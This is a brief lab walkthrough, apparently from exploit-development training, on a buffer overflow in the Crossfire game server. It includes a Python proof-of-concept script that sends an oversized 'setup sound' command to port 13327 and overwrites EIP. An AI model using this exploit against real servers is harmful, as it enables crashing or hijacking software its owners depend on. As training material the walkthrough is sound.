RDP in to the Debian Linux client. Then from root terminal:

`cd /usr/games/crossfire/bin/`
`./crossfire`

Crossfire will now accept all incoming network connections. 

Launch EDB Debugger:
`edb`

File -> Attach -> Crossfire
Run

Send the PoC Script:
```
#!/usr/bin/python
import socket
host = "10.11.0.128"
crash = "\x41" * 4379
buffer = "\x11(setup sound " + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent !"
```

We get a crash and find the EIP has been overwritten. 

